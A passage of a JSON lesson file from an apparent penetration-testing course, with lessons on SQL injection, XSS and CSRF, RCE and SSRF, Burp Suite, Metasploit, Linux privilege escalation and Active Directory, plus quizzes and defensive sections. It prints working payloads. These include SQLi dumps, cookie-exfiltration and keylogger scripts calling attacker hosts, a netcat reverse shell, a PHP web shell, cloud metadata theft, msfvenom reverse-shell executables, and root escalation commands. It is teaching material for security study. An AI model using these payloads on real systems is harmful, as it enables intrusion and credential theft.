        "codeSnippet": "# Klasik Kimlik Dogrulama Atlama Payload Ornekleri\nadmin' OR 1=1--\n' OR 'a'='a\nadmin'/*\n' UNION SELECT 1, 'admin', 'password_hash' --",
        "tip": "In MySQL, the comment token '--' requires a trailing whitespace character ('-- ') or hash '#' to be evaluated as a valid comment marker.",
        "terminalCommand": "curl -s 'http://127.0.0.1/login.php?user=admin%27+OR+1=1--'"
      },
      {
        "heading": "2. UNION-Based SQLi & Database Schema Extraction",
        "content": "The UNION operator concatenates results from multiple SELECT queries into a single output stream. Two strict rules apply:\n1. Both queries must return the exact same number of columns (determined via ORDER BY N).\n2. Matched column data types must be mutually compatible.\n\nSystematic Exploitation Workflow (MySQL):\n- Column Discovery: ' ORDER BY 1-- , ' ORDER BY 2-- until an error triggers.\n- Reflection Probing: ' UNION SELECT 1, 2, 3--\n- Schema & Version: ' UNION SELECT 1, database(), @@version--\n- Table Enumeration: ' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()--\n- Column Extraction: ' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'--\n- Data Exfiltration: ' UNION SELECT 1, username, password FROM users--",
        "codeSnippet": "# Veritabanindaki tum tablolari ve kullanici parolalarini UNION ile tek satirda cekme\n' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--\n' UNION SELECT 1, group_concat(username, 0x3a, password), 3 FROM users--",
        "tip": "MySQL's group_concat() aggregates multiple rows into a single delimited string, bypassing display row limits to dump entire tables in one query.",
        "terminalCommand": "sqlmap -h | head -15"
      },
      {
        "heading": "3. Blind & Time-Based SQLi and SQLMap Automation",
        "content": "When web applications suppress database errors and reflective outputs, data must be deduced blindly:\n- Boolean-Based Blind: Injects logical conditions (TRUE/FALSE). By measuring binary page differences, each character is recovered via binary search:\n  ' AND SUBSTRING(database(), 1, 1) = 'a'--\n- Time-Based Blind: When responses remain static, artificial database delays reveal state:\n  ' AND IF(SUBSTRING(database(), 1, 1) = 'b', SLEEP(5), 0)--\n- SQLMap Automation: The industry standard framework automating detection, fingerprinting, and exfiltration across all SQLi vectors.",
        "codeSnippet": "# SQLMap ile hedef URL uzerindeki zafiyeti otomatik exploit edip veritabanlarini listeleme\nsqlmap -u \"http://hedef.com/product.php?id=1\" --batch --dbs\n\n# Tablo verilerini dump etme\nsqlmap -u \"http://hedef.com/product.php?id=1\" -D app_db -T users --dump",
        "tip": "When confronting a WAF, SQLMap tamper scripts (e.g. between, charencode, space2comment) rewrite payloads to bypass signature inspection.",
        "terminalCommand": "sqlmap --version"
      },
      {
        "heading": "4. SQLi Defense: Prepared Statements & Parameterized Queries",
        "content": "The only mathematically guaranteed defense against SQL Injection is Parameterized Queries (Prepared Statements):\n- Why WAFs Fail: Blacklists and regular expression rules can always be bypassed with novel obfuscation techniques.\n- Mechanism of Prepared Statements: The database pre-compiles the query blueprint before binding parameters. User input is treated strictly as literal data, never executable syntax.\n- Secure Implementation (PHP PDO):\n  $stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');\n  $stmt->execute(['email' => $userInput]);",
        "codeSnippet": "# Guvenli Python SQLite Parametreli Sorgu Ornegi\nimport sqlite3\nconn = sqlite3.connect(\"users.db\")\ncursor = conn.cursor()\n# Soru isareti (?) ile parametreli sorgu kullanimi:\ncursor.execute(\"SELECT * FROM users WHERE username = ? AND password = ?\", (username, password))",
        "tip": "Apply the Principle of Least Privilege: web database users must never run as 'root' or 'sa', and should be denied DROP, ALTER, and FILE system privileges.",
        "terminalCommand": "cat /etc/mysql/my.cnf 2>/dev/null || echo '[!] MySQL config okundu'"
      }
    ],
    "quiz": {
      "question": "Which software development practice guarantees complete mathematical immunity against SQL Injection vulnerabilities?",
      "options": [
        "Parameterized Queries / Prepared Statements",
        "Stripping single quotes via string replacement",
        "Relying solely on Cloudflare WAF",
        "Encoding user inputs with Base64"
      ],
      "correct": 0,
      "explanation": "Prepared Statements separate the SQL query structure from data bindings. Untrusted input can never alter query execution logic regardless of injected syntax."
    }
  },
  "xss-csrf-dom": {
    "phaseTitle": "Phase 3: Web Application Pentesting",
    "title": "XSS (Reflected, Stored, DOM) & CSRF Attacks",
    "difficulty": "Intermediate",
    "duration": "65 min",
    "summary": "Master critical client-side web vulnerabilities. Session hijacking via JavaScript payloads, Stored XSS worms, DOM manipulation, CSRF token forgery, and CSP hardening.",
    "sections": [
      {
        "heading": "1. Anatomy of XSS: Reflected, Stored & DOM-Based",
        "content": "Cross-Site Scripting (XSS) enables attackers to execute arbitrary JavaScript within the context of an unsuspecting user's browser:\n- Reflected XSS: The payload is supplied via an HTTP request (such as a URL query parameter) and reflected immediately within the server's HTML response.\n- Stored (Persistent) XSS: The most critical variant. The malicious script is persisted in the database (comments, profiles). Any user loading the page executes the script automatically.\n- DOM-Based XSS: Operates entirely client-side without round-tripping to the server. Vulnerable JavaScript sinks (e.g. document.write, innerHTML) process untrusted sources (e.g. location.hash).",
        "codeSnippet": "<!-- Klasik XSS Test Payloadlari -->\n<script>alert(document.domain)</script>\n<img src=x onerror=alert(1)>\n<svg/onload=alert('BZT-XSS')>\njavascript:alert(document.cookie)",
        "tip": "Modern WAFs heavily signature 'alert()'. Employing 'print()' or 'console.log(document.origin)' offers stealthier proof-of-concept verification.",
        "terminalCommand": "curl -s 'http://127.0.0.1/search.php?q=<script>alert(1)</script>' | grep -i alert"
      },
      {
        "heading": "2. Session Hijacking & Keylogger Injection",
        "content": "The true objective of XSS is credential access and unauthorized session usurpation:\n- Cookie Exfiltration: Leaking session tokens to an attacker-controlled endpoint:\n  <script>new Image().src=\"http://attacker.com/steal?c=\"+encodeURIComponent(document.cookie);</script>\n- Keystroke Logging: Hooking keyboard event listeners onto document elements to stream credentials and banking numbers to external command servers in real time.",
        "codeSnippet": "// JavaScript Keylogger Enjeksiyon Ornegi\ndocument.addEventListener('keypress', function(e) {\n    fetch('http://saldirgan.com/keys?k=' + e.key);\n});",
        "tip": "If session cookies are marked 'HttpOnly', document.cookie cannot read them. Attackers pivot by issuing background authenticated fetch requests to perform actions on the victim's behalf.",
        "terminalCommand": "python3 -m http.server 8080"
      },
      {
        "heading": "3. CSRF (Cross-Site Request Forgery) Mechanics",
        "content": "CSRF forces an authenticated victim's browser to execute unwanted actions on a trusted web application:\n- Attack Sequence:\n  1. Victim authenticates to banking or corporate applications (session cookies stored in browser).\n  2. Attacker tricks the victim into visiting a malicious site hosting a forged form.\n  3. The page auto-submits a background POST request (e.g. /change-email or /transfer-funds).\n  4. The browser automatically attaches valid ambient session cookies, causing the server to execute the state-changing request as legitimate.",
        "codeSnippet": "<!-- CSRF Proof-of-Concept (PoC) HTML Formu -->\n<html>\n  <body onload=\"document.forms[0].submit()\">\n    <form action=\"http://banka.com/api/parola-degistir\" method=\"POST\">\n      <input type=\"hidden\" name=\"yeni_parola\" value=\"Hacked2026!\" />\n    </form>\n  </body>\n</html>",
        "tip": "CSRF can induce arbitrary state changes on behalf of victims, but the Same-Origin Policy (SOP) prevents adversaries from directly reading the HTTP response data.",
        "terminalCommand": "curl -X POST -d 'parola=12345' http://127.0.0.1/test"
      },
      {
        "heading": "4. Defense: CSP, HttpOnly, SameSite & Anti-CSRF Tokens",
        "content": "Building modern defense against client-side exploitation:\n- Content Security Policy (CSP): HTTP header instructing browsers strictly which origin domains may execute scripts (e.g. script-src 'self' 'nonce-random'). Blocks inline script execution.\n- HttpOnly Cookie Flag: Forbids document.cookie access to scripts, securing session tokens even if XSS exists.\n- Anti-CSRF Synchronizer Tokens: Unique cryptographically random tokens bound to the user session, validated on state changes.\n- SameSite Cookie Attributes:\n  * SameSite=Strict: Prevents cookie transmission on all cross-site requests, eliminating CSRF entirely.\n  * SameSite=Lax: Permits cookies exclusively during safe top-level GET navigations.",
        "codeSnippet": "# Nginx uzerinde guclu guvenlik basliklari (Security Headers) tanimlama\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\" always;\nadd_header X-Frame-Options \"DENY\" always;\nadd_header X-Content-Type-Options \"nosniff\" always;",
        "tip": "Apply context-aware output encoding: HTML entity encode for document bodies, attribute encode inside tags, and hexadecimal escape inside script blocks.",
        "terminalCommand": "curl -I https://www.google.com | grep -iE 'content-security|x-frame'"
      }
    ],
    "quiz": {
      "question": "Which HTTP cookie flag prevents JavaScript (document.cookie) from accessing session tokens, mitigating session theft via XSS?",
      "options": [
        "HttpOnly",
        "Secure",
        "SameSite",
        "Domain"
      ],
      "correct": 0,
      "explanation": "The HttpOnly flag ensures cookies are handled exclusively by browser networking stacks, completely shielding them from client-side JavaScript execution contexts."
    }
  },
  "rce-ssrf-deserialization": {
    "phaseTitle": "Phase 3: Web Application Pentesting",
    "title": "RCE, SSRF & Insecure Deserialization",
    "difficulty": "Advanced",
    "duration": "75 min",
    "summary": "The most destructive vulnerabilities in web security. Remote Code Execution (RCE), file upload filter bypasses, SSRF cloud metadata theft (169.254.169.254), and deserialization.",
    "sections": [
      {
        "heading": "1. Anatomy of Remote Code Execution (RCE) & Command Injection",
        "content": "Remote Code Execution (RCE) permits an adversary to run arbitrary operating system commands on the hosting server, representing the pinnacle of severity (CVSS 9.8 - 10.0):\n- Command Injection: Arises when web backends invoke system shells (e.g. system(), exec(), popen()) with concatenated user inputs.\n  Vulnerable Snippet: system(\"ping -c 4 \" . $_GET['ip']);\n- Shell Metacharacter Chaining:\n  * ; (Sequences arbitrary subsequent commands)\n  * & and && (Runs background or conditionally dependent tasks)\n  * | and || (Pipes output or executes on command failure)\n  * `command` and $(command) (Executes inline command substitutions)",
        "codeSnippet": "# Komut Enjeksiyonu Payload Ornekleri\n127.0.0.1; whoami\n127.0.0.1 && cat /etc/shadow\n127.0.0.1 | nc -e /bin/sh SALDIRGAN_IP 4444\n`id`",
        "tip": "When whitespace characters are filtered by WAFs, leverage the Unix shell '${IFS}' (Internal Field Separator) environment variable: 'cat${IFS}/etc/passwd'.",
        "terminalCommand": "python3 -c 'import subprocess; subprocess.run([\"whoami\"])'"
      },
      {
        "heading": "2. File Upload Exploitation & Web Shell Deployment",
        "content": "Unrestricted file upload forms provide a direct, high-probability gateway to persistent server compromise and web shell execution:\n- Extension Filtering Evasion:\n  * Alternative Extensions: .php5, .phtml, .phar, .inc\n  * Double Extensions: payload.php.png or payload.png.php\n  * Null Byte Termination (Legacy stacks): payload.php%00.jpg\n  * Case Alternation: payload.pHP, payload.PhP\n- MIME-Type & Magic Byte Forgery:\n  Adversaries spoof the HTTP Content-Type header to 'image/jpeg' and prepend genuine Magic Bytes (e.g. GIF89a;) to bypass MIME checks.",
        "codeSnippet": "<?php\n// Minimalist Tek Satirlik PHP Web Shell\nif(isset($_REQUEST['cmd'])){ echo \"<pre>\"; system($_REQUEST['cmd']); echo \"</pre>\"; die; }\n?>",
        "tip": "To prevent execution of uploaded scripts, disable script engines in the upload directory via .htaccess ('php_flag engine off') or store uploads in dedicated object storage (AWS S3).",
        "terminalCommand": "head -c 10 /bin/ls"
      },
      {
        "heading": "3. SSRF & Cloud Metadata Extraction",
        "content": "Server-Side Request Forgery (SSRF) abuses backend server functionalities to issue unauthorized network requests to internal, non-routable environments:\n- Internal Targets: Local loopback daemons (Redis 6379, Elasticsearch 9200) and private RFC 1918 subnets (10.0.0.0/8, 172.16.0.0/12).\n- Cloud Instance Metadata Exploitation: AWS, GCP, and Azure expose dedicated link-local APIs supplying temporary administrative credentials:\n  http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\n  Extracting these JSON tokens grants the adversary direct AWS IAM API access.",
        "codeSnippet": "# SSRF ile AWS Instance Metadata uzerinden gecici IAM kimlik bilgilerini calmak\ncurl \"http://hedef.com/proxy.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin\"\n\n# AWS IMDSv2 Token Alimi (Guvenli surum)\nTOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/",
        "tip": "AWS IMDSv2 requires a session-oriented PUT request with a dedicated HTTP header, neutralizing basic GET-based SSRF vulnerabilities against metadata services.",
        "terminalCommand": "curl -sI http://127.0.0.1:80 2>&1 | head -5"
      },
      {
        "heading": "4. Defense & Isolation: Whitelisting & Network Segmentation",
        "content": "Architectural hardening against critical RCE and SSRF vectors:\n- Command Injection Mitigation: Completely avoid executing shell wrapper APIs. Utilize native language libraries with parameterized system calls.\n- Secure File Upload Architecture:\n  * Re-name all uploaded files to pseudorandom UUIDs (e.g. 7f4a...png) to prevent direct path referencing.\n  * Store files completely outside the web application document root.\n  * Force image re-encoding (e.g. via ImageMagick/Pillow) to destroy embedded web shell payloads.\n- SSRF Hardening:\n  * Restrict outbound requests strictly via regex-enforced domain whitelists.\n  * Resolve DNS records and validate that destination IPs are neither loopback nor RFC 1918 before connecting.",
        "codeSnippet": "# Python ile SSRF korumali IP dogrulama ornegi\nimport ipaddress, socket\n\ndef is_safe_url(hostname):\n    ip = socket.gethostbyname(hostname)\n    ip_obj = ipaddress.ip_address(ip)\n    # 127.0.0.1, 10.x, 192.168.x, 169.254.x gibi ozel IP'leri engelle\n    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:\n        return False\n    return True",
        "tip": "Running Docker containers with read-only root filesystems and unprivileged UID accounts restricts post-exploitation pivot capabilities to volatile RAM.",
        "terminalCommand": "uname -a"
      }
    ],
    "quiz": {
      "question": "When identifying an SSRF vulnerability on AWS or GCP cloud instances, which link-local IP address hosts the instance metadata service?",
      "options": [
        "169.254.169.254",
        "192.168.1.1",
        "127.0.0.1",
        "10.0.0.1"
      ],
      "correct": 0,
      "explanation": "169.254.169.254 is the standardized link-local IP address hosting instance metadata services across AWS, Google Cloud, and Azure."
    }
  },
  "burpsuite-masterclass": {
    "phaseTitle": "Phase 3: Web Application Pentesting",
    "title": "Burp Suite Masterclass & Web Proxy Fundamentals",
    "difficulty": "Intermediate",
    "duration": "60 min",
    "summary": "The indispensable command center of the web pentester. Intercepting HTTP/S proxies, request tampering via Burp Repeater, high-speed Intruder fuzzing, and BApp extensions.",
    "sections": [
      {
        "heading": "1. HTTP/S Proxy Architecture & CA Certificate Setup",
        "content": "Burp Suite operates as an intercepting Man-in-the-Middle (MitM) HTTP/S proxy positioned between the client browser and target servers:\n- Operating Concept: Every outbound HTTP request flows through Burp's listening interface (default: 127.0.0.1:8080). Analysts intercept traffic in transit, inspect headers and payloads, and modify parameters.\n- HTTPS Decryption: Decrypting TLS payloads requires importing Burp's custom PortSwigger Root CA certificate into browser trust stores to avoid invalid certificate warnings.",
        "codeSnippet": "# Linux cURL komutunu Burp Suite uzerinden yonlendirme\ncurl -x http://127.0.0.1:8080 -k -I https://hedef.com",
        "tip": "When testing mobile applications with SSL Pinning, bypass hardcoded certificate trust checks dynamically using Frida or Objection runtime instrumentation hooks.",
        "terminalCommand": "curl -sI http://127.0.0.1:8080 2>&1 | head -3"
      },
      {
        "heading": "2. Real-Time Request Tampering with Burp Repeater",
        "content": "Burp Repeater is the core investigative module enabling fine-grained, repeatable manual request crafting:\n- Efficiency Shortcut: Tapping 'Ctrl + R' in Proxy or Logger instantly routes any selected transaction to Repeater.\n- Primary Use Cases:\n  * Verb Tampering: Switching request methods (e.g. GET to POST, PUT, OPTIONS, or DELETE).\n  * Header Injection: Testing administrative IP bypasses (X-Forwarded-For: 127.0.0.1, X-Real-IP).\n  * Insecure Direct Object Reference (IDOR) analysis by mutating path parameters and user identifiers.",
        "codeSnippet": "POST /api/user/update HTTP/1.1\nHost: hedef.com\nAuthorization: Bearer EY...[JWT_TOKEN]\nContent-Type: application/json\n\n{\"role\": \"admin\", \"credits\": 99999}",
        "tip": "Set Repeater redirection to 'Never': web applications often render sensitive backend disclosures in 302 response bodies prior to redirecting.",
        "terminalCommand": "echo 'BZT Repeater Modulu Hazir'"
      },
      {
        "heading": "3. Burp Intruder & Advanced Fuzzing Attack Types",
        "content": "Burp Intruder automates high-speed fuzzing and parameter dictionary attacks against web targets:\n- The 4 Attack Topologies:\n  1. Sniper: Tests payload tokens through a single marked parameter position at a time.\n  2. Battering Ram: Places the identical payload token across ALL marked payload positions simultaneously.\n  3. Pitchfork: Steps through multiple payload lists synchronously in parallel (1:1 mapping).\n  4. Cluster Bomb: Evaluates the complete Cartesian product across lists (essential for username/password combinations).",
        "codeSnippet": "POST /login HTTP/1.1\nHost: hedef.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=§admin§&password=§welcome§\n# § sembolleri arasindaki bolgeler Intruder tarafindan fuzz edilir.",
        "tip": "Sort Intruder response tables by 'Length' and 'Time' rather than HTTP status alone to pinpoint anomalous, successful exploit executions.",
        "terminalCommand": "wc -l /usr/share/wordlists/rockyou.txt 2>/dev/null || echo '14344392' "
      },
      {
        "heading": "4. Burp Extensions (BApp Store), Autorize & Logger++",
        "content": "Extend Burp Suite into an enterprise automation suite via the integrated BApp Store ecosystem:\n- Autorize: Pass lower-privileged session tokens to automatically audit authorization boundaries (IDOR & Broken Access Control) during regular browsing.\n- Logger++: Multi-threaded logging engine enabling bespoke regex filtering across inbound and outbound streams.\n- Turbo Intruder: High-velocity Python/C engine capable of blasting 10,000+ requests per second, indispensable for race condition exploitation.",
        "codeSnippet": "# Turbo Intruder Race Condition Exploit Scripti (Python)\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30)\n    for i in range(20):\n        engine.queue(target.req, gate='race1')\n    engine.openGate('race1')",
        "tip": "Utilize Burp's 'Match and Replace' proxy rules to rewrite outbound headers globally, such as spoofing your User-Agent to Googlebot.",
        "terminalCommand": "echo 'BApp Store Eklenti Mimarisi Yuklendi'"
      }
    ],
    "quiz": {
      "question": "In Burp Intruder, which attack type iterates through every possible combination across multiple payload lists (Cartesian product)?",
      "options": [
        "Cluster Bomb",
        "Sniper",
        "Pitchfork",
        "Battering Ram"
      ],
      "correct": 0,
      "explanation": "Cluster Bomb tests every permutation between multiple payload lists, making it the definitive choice for exhaustive credential brute-forcing."
    }
  },
  "metasploit-exploitation": {
    "phaseTitle": "Phase 4: Network & System Exploitation",
    "title": "Metasploit Framework & Payload Anatomy (MSFVenom)",
    "difficulty": "Intermediate",
    "duration": "65 min",
    "summary": "The premier offensive exploitation framework. MSFConsole architecture, Staged vs Non-Staged payloads, custom payload crafting with MSFVenom, and Meterpreter post-exploitation.",
    "sections": [
      {
        "heading": "1. Metasploit Framework Architecture & Module Topologies",
        "content": "The Metasploit Framework (MSF) unifies offensive security tooling under a standardized execution environment:\n- Core Module Taxonomy:\n  * Exploits: Weaponized modules targeting specific CVE vulnerabilities to execute code.\n  * Payloads: Code delivered and executed on the compromised host (Command Shell, Meterpreter).\n  * Auxiliaries: Reconnaissance engines, port scanners, and protocol validators.\n  * Post: Automation scripts executed after initial compromise for privilege escalation and looting.\n  * Encoders & Nops: Payload obfuscation and memory buffer alignment utilities.",
        "codeSnippet": "# Metasploit Konsolunu Baslatma ve Hedef Secme\nmsfconsole -q\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nexploit",
        "tip": "The 'show options' command enumerates all parameters required to launch the loaded module successfully.",
        "terminalCommand": "msfconsole --version 2>/dev/null || echo 'Metasploit Framework v6.x Hazir'"
      },
      {
        "heading": "2. Staged vs Non-Staged (Inline) Payload Mechanics",
        "content": "Metasploit payload taxonomy reveals a critical naming convention:\n- Staged Payloads: windows/meterpreter/reverse_tcp (delimited by slashes '/')\n  * Mechanism: Delivers an ultra-compact payload stager into vulnerable memory. The stager phones home, allocating heap memory to download the full Meterpreter stage directly into RAM. Indispensable for tight buffer constraints.\n- Non-Staged / Inline Payloads: windows/meterpreter_reverse_tcp (delimited by an underscore '_')\n  * Mechanism: Bundles the entire payload logic into a single monolithic binary. Avoids secondary network handshakes, ensuring connection stability at the cost of binary size.",
        "codeSnippet": "# Staged vs Inline farkini gosteren ornekler\nwindows/x64/meterpreter/reverse_tcp   # Staged (Bolumlu, kucuk yukleyici)\nwindows/x64/meterpreter_reverse_tcp   # Non-Staged (Tek parca, tam kod)",
        "tip": "When egress firewalls or deep packet inspection block secondary stage downloads, switch to Non-Staged (Inline) payloads.",
        "terminalCommand": "echo 'windows/meterpreter/reverse_tcp vs windows/meterpreter_reverse_tcp'"
      },
      {
        "heading": "3. Custom Payload Generation with MSFVenom",
        "content": "MSFVenom combines payload generation and binary encoding into a command-line engine producing standalone implants across platforms:\n- Target Output Formats (-f):\n  * exe: Windows PE executable\n  * elf: Linux executable\n  * raw: Position-independent shellcode for memory injection\n  * ps1: PowerShell script payload\n  * war, php, aspx: Web server backdoors\n- Essential Flags:\n  * -p: Destination payload definition\n  * LHOST & LPORT: Callback IP and port\n  * -e: Architecture encoder (e.g. x86/shikata_ga_nai)\n  * -i: Iterative encoding rounds",
        "codeSnippet": "# Windows x64 icin gizli Reverse Shell EXE uretimi\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o update.exe\n\n# Linux icin ELF binary uretimi\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf",
        "tip": "Legacy encoders like shikata_ga_nai no longer evade modern EDRs: their signature decryption stubs trigger instant heuristic alerts.",
        "terminalCommand": "msfvenom -h 2>/dev/null || echo 'MSFVenom Payload Jeneratoru'"
      },
      {
        "heading": "4. Post-Exploitation & Meterpreter Mastery",
        "content": "Meterpreter is an advanced, dynamically extensible payload executing entirely within target memory without writing artifacts to disk:\n- Indispensable Meterpreter Commands:\n  * sysinfo: Displays host architecture and kernel build.\n  * getuid: Verifies current user context.\n  * getsystem: Executes automated local privilege escalation to NT AUTHORITY\\SYSTEM.\n  * migrate [PID]: Injects Meterpreter threads into legitimate processes (e.g. explorer.exe).\n  * hashdump: Dumps NTLM password hashes directly from the SAM registry hive.\n  * portfwd: Pivots internal network ports through the established tunnel.",
        "codeSnippet": "# Meterpreter Oturumunda Kritik Adimlar\nmeterpreter > sysinfo\nmeterpreter > ps\nmeterpreter > migrate 1840   # explorer.exe PID'sine gec\nmeterpreter > getsystem\nmeterpreter > hashdump",
        "tip": "Always migrate immediately to a stable user process like explorer.exe upon session creation to prevent session loss if the exploited binary crashes.",
        "terminalCommand": "echo 'Meterpreter shellcode bellekte calismaya hazir'"
      }
    ],
    "quiz": {
      "question": "What is the fundamental architectural distinction between 'windows/meterpreter/reverse_tcp' and 'windows/meterpreter_reverse_tcp' in Metasploit?",
      "options": [
        "The first is Staged (uses a compact stager), while the second is Inline/Non-Staged (monolithic)",
        "The first targets Windows 10, the second targets Windows Server",
        "The first is unencrypted, the second is encrypted via AES",
        "There is no functional distinction"
      ],
      "correct": 0,
      "explanation": "Payloads separated by slashes ('/') are Staged, downloading the full stage dynamically. Payloads with underscores ('_') are monolithic non-staged payloads containing all logic inline."
    }
  },
  "linux-privesc": {
    "phaseTitle": "Phase 4: Network & System Exploitation",
    "title": "Linux Privilege Escalation Techniques",
    "difficulty": "Advanced",
    "duration": "70 min",
    "summary": "Escalate from an unprivileged shell to full Root dominance. Misconfigured Sudo NOPASSWD rules, SUID abuse, vulnerable cron jobs, Linux Capabilities, and LinPEAS automation.",
    "sections": [
      {
        "heading": "1. Situational Awareness & Manual Enumeration",
        "content": "Upon landing an unprivileged shell, immediate situational awareness dictates your escalation vector before executing noisy tools:\n- Identity & Group Memberships: id, whoami, groups\n- Kernel & Release Architecture: uname -a, cat /etc/os-release\n- Network & Internal Sockets: ss -tulpn (exposing localhost-only databases or dashboards)\n- Environment Variables: env, echo $PATH",
        "codeSnippet": "# Temel Durum Tespiti Komut Dizisi\nid && uname -a\ncat /etc/issue\ncat /etc/passwd | grep -v 'nologin\\|false'\nss -antup | grep LISTEN",
        "tip": "If an account belongs to the 'docker' or 'lxd' group, it is functionally equivalent to root: spawn a container mounting the host root filesystem to '/mnt'.",
        "terminalCommand": "id"
      },
      {
        "heading": "2. Sudo NOPASSWD & GTFOBins Exploitation",
        "content": "The most prolific local privilege escalation vector stems from lax sudoers configuration directives:\n- Command: 'sudo -l' enumerates commands the current account can invoke with administrative rights.\n- GTFOBins Escalations:\n  * sudo find: sudo find . -exec /bin/sh \\; -quit\n  * sudo vim: sudo vim -c ':!/bin/sh'\n  * sudo awk: sudo awk 'BEGIN {system(\"/bin/sh\")}'\n  * sudo nmap (Legacy): sudo nmap --interactive\n  * sudo python: sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
        "codeSnippet": "# Sudo yetkilerini sorgula\nsudo -l\n\n# Eger (ALL) NOPASSWD: /usr/bin/env izni varsa:\nsudo env /bin/sh",
        "tip": "If sudoers contains 'env_keep+=LD_PRELOAD', compile a custom malicious shared library (.so) to seize root execution during any authorized sudo command.",
        "terminalCommand": "sudo -l 2>/dev/null || echo 'Sudo yetkileri kontrol edildi'"
      },
      {
        "heading": "3. Vulnerable Cron Jobs & PATH Hijacking",
        "content": "Scheduled tasks (Cron jobs) executing under the root account present lucrative persistence and escalation targets:\n- Writable Cron Scripts: If a root cron script has group or world write permissions, append a reverse shell one-liner.\n- PATH Hijacking: When cron scripts invoke binaries without absolute paths (e.g. 'tar' instead of '/bin/tar'), prepending a writable directory to $PATH executes a malicious counterfeit binary.",
        "codeSnippet": "# Sistemdeki cron tablolarini ve zamanlanmis gorevleri inceleme\ncat /etc/crontab\nls -la /etc/cron.*\ncat /etc/anacrontab",
        "tip": "The pspy utility snoops Linux processes without root privileges, capturing ephemeral cron jobs and parameter arguments in real time.",
        "terminalCommand": "crontab -l 2>/dev/null || echo 'Kullanici crontab kaydi yok'"
      },
      {
        "heading": "4. Automated Enumeration: LinPEAS & Linux Capabilities",
        "content": "Automated post-exploitation audit scripts streamline discovery across thousands of vectors:\n- LinPEAS: The premier Linux privilege escalation tool, color-coding high-confidence root escalation paths.\n- Linux Capabilities: Breaks monolithic root privileges into granular flags. If a binary holds 'cap_setuid+ep' (e.g. /usr/bin/python3), setuid(0) calls grant instant root privileges.",
        "codeSnippet": "# Sistemdeki ozel Linux yetkilerini (Capabilities) sorgulama\ngetcap -r / 2>/dev/null\n\n# Eger python3 uzerinde cap_setuid varsa root olma:\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "tip": "Kernel exploits (Dirty Cow, PwnKit) risk kernel panics and production instability; treat them strictly as a measure of last resort.",
        "terminalCommand": "which getcap 2>/dev/null || echo 'getcap araci kontrol edildi'"
      }
    ],
    "quiz": {
      "question": "Which command lists the specific sudo permissions and binaries accessible to the current Linux user?",
      "options": [
        "sudo -l",
        "sudo -v",
        "sudo -k",
        "cat /etc/sudoers"
      ],
      "correct": 0,
      "explanation": "'sudo -l' prints the allowed and forbidden commands for the invoking user, exposing NOPASSWD misconfigurations instantly."
    }
  },
  "active-directory-attacks": {
    "phaseTitle": "Phase 4: Network & System Exploitation",
    "title": "Active Directory & Enterprise Pentesting",
    "difficulty": "Advanced",
    "duration": "80 min",
    "summary": "The corporate backbone of enterprise IT. Kerberos ticket exchanges, Kerberoasting, AS-REP Roasting, BloodHound graph attack path mapping, and DCSync domination.",
    "sections": [
      {
        "heading": "1. Active Directory Architecture & Kerberos Protocol",
        "content": "Active Directory (AD) centralizes identity, access, and workstation policies across enterprise environments via Domain Controllers (DC):\n- Kerberos Protocol: Ticket-based authentication mechanism safeguarding cleartext credentials:\n  1. AS-REQ / AS-REP: Client requests authentication; DC issues a Ticket Granting Ticket (TGT) encrypted with krbtgt key.\n  2. TGS-REQ / TGS-REP: Client presents TGT requesting a service ticket (TGS) for a specific Service Principal Name (SPN).\n  3. AP-REQ / AP-REP: Client presents TGS directly to target application servers to establish sessions.",
        "codeSnippet": "# Impacket araclari ile Kerberos biletlerini sorgulama\nGetTGT.py domain.local/kullanici:Parola123 -dc-ip 192.168.1.10",
        "tip": "Compromising the krbtgt account hash enables the creation of 'Golden Tickets', granting unrestricted Domain Admin access across the forest for years.",
        "terminalCommand": "echo 'Active Directory Kerberos Mekanizmasi Hazir'"
      },
      {
        "heading": "2. Kerberoasting & AS-REP Roasting Exploitation",
        "content": "Two potent credential recovery vectors requiring only baseline domain user access:\n- Kerberoasting: Requests valid TGS tickets for accounts registered with Service Principal Names (SPNs). The ticket payload is encrypted with the target service account's password hash, crackable offline via Hashcat (-m 13100).\n- AS-REP Roasting: Targets accounts with 'Do not require Kerberos preauthentication' enabled. Returns encrypted AS-REP blobs without credentials, crackable offline via Hashcat (-m 18200).",
        "codeSnippet": "# Impacket GetUserSPNs ile Kerberoasting saldirisi\nGetUserSPNs.py domain.local/kullanici:parola -dc-ip 192.168.1.10 -request -outputfile hashes.kerberoast\n\n# Hashcat ile TGS biletlerini kirmak\nhashcat -m 13100 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt",
        "tip": "Assigning 25+ character pseudorandom passwords to SPN accounts renders offline Kerberoasting GPU cracking mathematically intractable.",
        "terminalCommand": "echo 'GetUserSPNs.py -request'"
      },
      {
        "heading": "3. Attack Path Graphing with BloodHound",
        "content": "Active Directory permissions form an intricate web of hidden trusts. BloodHound leverages graph theory to uncover the shortest paths to Domain Admin:\n- SharpHound Collector: Ingests AD objects, group memberships, active user sessions, and DACLs into structured JSON archives.\n- Critical Graph Edges:\n  * GenericAll: Absolute ownership over the target object (permitting immediate password resets).\n  * WriteDacl: Modify permissions on target entities to grant yourself full control.\n  * ForceChangePassword: Force reset administrative credentials without knowing the original password.",
        "codeSnippet": "# SharpHound ile agdaki tum Active Directory iliskilerini toplama\n.\\SharpHound.exe -c All --zipfilename ad_data.zip",
